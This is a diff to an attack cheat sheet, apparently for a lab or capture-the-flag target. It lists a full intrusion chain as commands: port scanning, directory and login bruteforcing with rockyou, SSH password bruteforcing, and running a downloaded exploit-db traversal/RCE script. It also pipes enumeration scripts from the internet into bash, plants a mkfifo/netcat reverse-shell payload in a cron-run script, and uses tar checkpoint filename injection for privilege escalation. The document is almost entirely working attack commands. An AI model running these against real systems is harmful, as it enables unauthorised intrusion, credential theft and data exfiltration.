@@ -1,16 +1,43 @@
+nano ssh_users.txt 
+```
+admin
+administrator
+webadmin
+webmaster
+```
+
+nano web_users.txt
+```
+admin@majestic.local
+```
+
 ```bash
+target=10.5.20.12
+
 # scanning
 nmap -sSV -p- -Pn -n -O $target
+
 # directory bruteforce
 gobuster dir -u http://$target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
 # bruteforcing login page
-hydra -L users.txt -P passwords.txt $target http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid password"
+ffuf -u http://10.5.20.12/user/log-in.php -X POST \
+-H "Cookie: PHPSESSID=tg6bk1lbboajafumsv03n2t0o8" \
+-H "Content-Type: application/x-www-form-urlencoded" \
+-d "email=FUZZ1&password=FUZZ2" \
+-w ./web_users.txt:FUZZ1 -w /usr/share/wordlists/rockyou.txt:FUZZ2 \
+-fc 401
+
+# bruteforcing ssh
+hydra -vV -L ./ssh_users.txt -P /usr/share/wordlists/rockyou.txt ssh://$target
+
 # known directory traversal exploit to read /etc/passwd unsucessful 
 wget -O exploit.sh https://www.exploit-db.com/raw/50406
 echo $target > targets.txt
-bash explit.sh targets.txt /etc/passwd
+bash exploit.sh targets.txt /etc/passwd
+
 # so he tries RCE which results in shell
-bash explit.sh targets.txt /bin/sh id
+bash exploit.sh targets.txt /bin/sh id
 
 # reverse shell
 nc -lvnp 4444
@@ -35,9 +62,6 @@ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
 # linenum
 curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
 
-# Bruteforce ssh 
-hydra -L users.txt -P passwords.txt $target http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid password"
-
 #! cronjob
 nc -lvnp 1337
 echo 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc '$target' 1337 > /tmp/f' > /usr/local/apache2/htdocs/exploit.sh
@@ -46,7 +70,7 @@ echo '' > /usr/local/apache2/htdocs/'--checkpoint=1'
 echo '' > /usr/local/apache2/htdocs/'--checkpoint-action=exec=sh exploit.sh'
 
 #! mysql dump
-mysqldump -u root webapp | gzip > /var/backups/database_$(date +\%F).sql.gz
+mysqldump -u root webapp | gzip > /opt/database_$(date +\%F).sql.gz
 
 #! information exfiltration
 
